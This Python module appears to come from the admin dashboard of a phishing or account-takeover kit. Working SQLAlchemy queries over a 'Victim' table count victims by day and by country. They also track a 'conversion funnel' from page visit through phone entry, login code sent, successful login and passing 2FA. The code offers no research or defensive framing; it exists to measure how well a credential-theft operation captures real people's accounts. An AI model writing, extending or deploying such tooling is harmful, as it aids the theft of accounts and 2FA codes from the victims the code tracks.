"""Analytics data aggregation for the analytics dashboard."""
from datetime import datetime, timezone, timedelta
from sqlalchemy import func


def get_victim_stats_over_time(db, days=30):
    """Returns daily victim counts for the last N days."""
    from models.victim import Victim
    cutoff = datetime.now(timezone.utc) - timedelta(days=days)
    rows = (
        db.session.query(
            func.date(Victim.first_visit_at).label('date'),
            func.count(Victim.id).label('count'),
        )
        .filter(Victim.first_visit_at >= cutoff)
        .group_by(func.date(Victim.first_visit_at))
        .order_by(func.date(Victim.first_visit_at))
        .all()
    )
    return [{'date': str(r.date), 'count': r.count} for r in rows]


def get_victim_country_distribution(db, limit=10):
    """Returns top countries by victim count."""
    from models.victim import Victim
    rows = (
        db.session.query(
            Victim.country.label('country'),
            func.count(Victim.id).label('count'),
        )
        .filter(Victim.country.isnot(None))
        .group_by(Victim.country)
        .order_by(func.count(Victim.id).desc())
        .limit(limit)
        .all()
    )
    return [{'country': r.country or 'Unknown', 'count': r.count} for r in rows]


def get_funnel_data(db):
    """Returns conversion funnel counts."""
    from models.victim import Victim
    total = db.session.query(func.count(Victim.id)).scalar() or 0
    phone_entered = db.session.query(func.count(Victim.id)).filter(Victim.phone.isnot(None)).scalar() or 0
    code_sent = db.session.query(func.count(Victim.id)).filter(Victim.status.in_(['code_sent', 'logged_in', '2fa_passed'])).scalar() or 0
    logged_in = db.session.query(func.count(Victim.id)).filter(Victim.status.in_(['logged_in', '2fa_passed'])).scalar() or 0
    twofa_passed = db.session.query(func.count(Victim.id)).filter(Victim.status == '2fa_passed').scalar() or 0
    return {
        'visited': total,
        'phone_entered': phone_entered,
        'code_sent': code_sent,
        'logged_in': logged_in,
        'twofa_passed': twofa_passed,
    }
